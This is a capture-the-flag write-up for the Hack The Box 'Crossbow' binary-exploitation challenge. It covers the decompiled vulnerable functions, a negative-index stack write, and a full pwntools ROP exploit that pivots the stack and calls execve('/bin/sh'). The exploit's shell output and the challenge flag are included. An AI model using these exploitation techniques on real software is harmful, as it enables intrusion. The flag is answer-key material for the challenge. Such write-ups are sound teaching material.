# 2025 HTB Cyber Apocalypse - Crossbow

We run the binary:
```
~~ Get this Arrow to the Knee of the enemy ~~
⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣄
⠀⠀⠀⠀⢸⣟⠻⢶⣦⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠀⠈⠳⣄
⠀⠀⠀⠀⠘⣿⠀⠀⠈⠙⠻⢿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⣿⡀⠀⠀⠈⠳⣄
⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠈⠙⠿⣿⣿⣿⠟⢀⣴⣦⡈⠻⣦⣤⣀⣀⡟
⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⣠⣾⣿⢟⣿⣿⠆⠀⠀⠀⠈⠀
⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⡿⠋⣠⣿⡿⢁⣤
⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⣴⣿⡿⠋⣠⣾⡿⠋⢠⣿⣿⣷⡀
⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⣠⣾⡿⠋⣠⣾⣿⠟⠁⠀⠈⢻⣿⣿⣷
⠀⠀⠀⠀⠀⠈⣿⠀⠀⢠⣾⡿⠋⣠⣾⡿⠛⠁⠀⠀⠀⠀⠀⠹⣿⣿⡄
⠀⠀⠀⠀⠀⠀⣿⢀⣴⡿⠋⣠⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣇
⠀⠀⠀⠀⠀⢀⣿⡿⠋⣠⣾⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⡀
⠀⠀⠀⠀⣠⣿⣿⣧⣾⣿⣥⣤⣤⣄⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠹⣧
⠀⠀⣠⣾⣿⣿⡿⠛⠁⠀⠀⠀⠉⠉⠉⠉⠉⠉⠙⠛⠛⠛⠛⠛⠛⠿⠶⠿⠇
⠀⠘⢿⣿⡿⠋
⠀⠀⠀⠉

[Sir Alaric]: You only have 1 shot, don't miss!!

[Sir Alaric]: Select target to shoot: 1

[Sir Alaric]: Give me your best warcry!!

> a

[Sir Alaric]: That was quite a shot!!
```

Internals look like this, function `main`:
```
undefined8 main(void)

{
  setvbuf((FILE *)__stdin_FILE,(char *)0x0,2,0);
  setvbuf((FILE *)__stdout_FILE,(char *)0x0,2,0);
  alarm(0x1312);
  banner();
  training();
  return 0;
}
```

Important function `training`:
```
void training(void)

{
  undefined1 local_28 [32];
  
  printf("%s\n[%sSir Alaric%s]: You only have 1 shot, don\'t miss!!\n",&DAT_0040b4a8,&DAT_0040b00e,
         &DAT_0040b4a8);
  target_dummy((long)local_28);
  printf("%s\n[%sSir Alaric%s]: That was quite a shot!!\n\n",&DAT_0040b4a8,&DAT_0040b00e,
         &DAT_0040b4a8);
  return;
}
```

Note how `training` function allocates 32 bytes on its stack and then passes its stack address to `target_dummy`. Disassembled function `target_dummy`:
```
void target_dummy(long param_1)

{
  long *plVar1;
  int iVar2;
  void *pvVar3;
  char *pcVar4;
  int local_1c [3];
  
  printf("%s\n[%sSir Alaric%s]: Select target to shoot: ",&DAT_0040b4a8,&DAT_0040b00e,&DAT_0040b4a8)
  ;
  iVar2 = scanf("%d%*c",local_1c);
  if (iVar2 != 1) {
    printf("%s\n[%sSir Alaric%s]: Are you aiming for the birds or the target kid?!\n\n",
           &DAT_0040b4e4,&DAT_0040b00e,&DAT_0040b4e4);
                    /* WARNING: Subroutine does not return */
    exit(0x520);
  }
  plVar1 = (long *)((long)local_1c[0] * 8 + param_1);
  pvVar3 = calloc(1,0x80);
  *plVar1 = (long)pvVar3;
  if (*plVar1 == 0) {
    printf("%s\n[%sSir Alaric%s]: We do not want cowards here!!\n\n",&DAT_0040b4e4,&DAT_0040b00e,
           &DAT_0040b4e4);
                    /* WARNING: Subroutine does not return */
    exit(0x1b39);
  }
  printf("%s\n[%sSir Alaric%s]: Give me your best warcry!!\n\n> ",&DAT_0040b4a8,&DAT_0040b00e,
         &DAT_0040b4a8);
  pcVar4 = fgets_unlocked(*(char **)(param_1 + (long)local_1c[0] * 8),0x80,(FILE *)__stdin_FILE);
  if (pcVar4 == (char *)0x0) {
    printf("%s\n[%sSir Alaric%s]: Is this the best you have?!\n\n",&DAT_0040b4e4,&DAT_0040b00e,
           &DAT_0040b4e4);
                    /* WARNING: Subroutine does not return */
    exit(0x45);
  }
  return;
}
```

The `param_1` in `target_dummy` is the stack address allocated by function `training` and we can write to any position during "target selection". Since the stack frame of `training` function is located below `target_dummy` function, this implicates that stored RIP value will be somewhere in between those two stack frames. Additionally, if we write to the lower stack frame, and we can choose the position, we can simply target the stored RIP value in the `target_dummy` function stack frame by specifying the negative value of the target in the first query. Here is a simple depiction of the situation:
```
-------   <-- target_dummy stack pointer
|     |
|     |
|     |
|-----|   <-- target_dummy base pointer
| RBP |   <-- stored base pointer (pivot -2, selected target)
| RIP |   <-- stored instruction pointer
-------   <-- target function stack pointer (pivot, local_28[0])
| ... |
|-----|
```

Once we have control of the stored RIP, we can build a ROP chain that would give us a shell. Conveniently there was a `pop rsp` gadget available which enabled us to perform a stack pivot and extend our chains beyond initial memory limitations. Initial idea was to overwrite stored RBP with `/bin/sh` to somehow load it into another register as a parameter but this failed so the final chain ended up being `syscall_read(stdin, RW_SECTION, 1024)` to write "/bin/sh" into an RW section and then execute `syscall_execve(RW_SECTION, 0, 0)`.

```
from pwn import *

context.os = 'linux'
context.arch = 'amd64'

POP_RDI = p64(0x0000000000401d6c)
POP_RSI = p64(0x000000000040566b)
POP_RDX = p64(0x0000000000401139)
POP_RAX = p64(0x0000000000401001)
POP_R12 = p64(0x00000000004018b4)
POP_RSP = p64(0x00000000004018b5)
MOV_RSI_RBP_SYSCALL = p64(0x00000000004052c1)
MOV_RDI_RBP_SYSCALL = p64(0x0000000000408e8f)
scall = 0x00000000004015d3
SYSCALL = p64(0x00405378)
RW_SECTION = 0x40d000
STDIO_READ = p64(0x00405390)
CALL_R12 = p64(0x000000000040171c)
STDIN = p64(0x0040dfc8)

e = ELF("./crossbow")
r = process("./crossbow")
#gdb.attach(r, '''
#set follow-fork-mode child
#b *0x0040126f
#b *0x004013b8
#continue
#''')

r.recvuntil(b"shoot: ")
r.sendline(b"-2")
r.recvuntil(b"> ")

payload  = b"/bin/sh\x00"
payload += POP_RAX
payload += p64(0) #read
payload += POP_RDI
payload += p64(0) #stdin
payload += POP_RSI
payload += p64(RW_SECTION)
payload += POP_RDX
payload += p64(1024)
payload += SYSCALL
payload += b"A"*8

payload += POP_RSP
payload += p64(RW_SECTION+8)

r.sendline(payload)

sleep(1)
payload  = b"/bin/sh\x00"
payload += POP_RAX
payload += p64(59) #execve
payload += POP_RDI
payload += p64(RW_SECTION) #/bin/sh
payload += POP_RSI
payload += p64(0)
payload += POP_RDX
payload += p64(0)
payload += SYSCALL
r.sendline(payload)
r.interactive()
```

Local execution:
```
$ python3 xpl.py 
[*] '/home/vm/Documents/htbctf/pwn_crossbow/crossbow'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
    Debuginfo:  Yes
[+] Starting local process './crossbow': pid 10708
[*] Switching to interactive mode

[Sir Alaric]: That was quite a shot!!

$ id
uid=1000(vm) gid=1000(vm) groups=1000(vm),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
$ 
[*] Interrupted
[*] Stopped process './crossbow' (pid 10708)
```

```
HTB{st4t1c_b1n4r13s_ar3_2_3z_9ec5399fdcbcd8611c2bab360f6a6d0b}
```
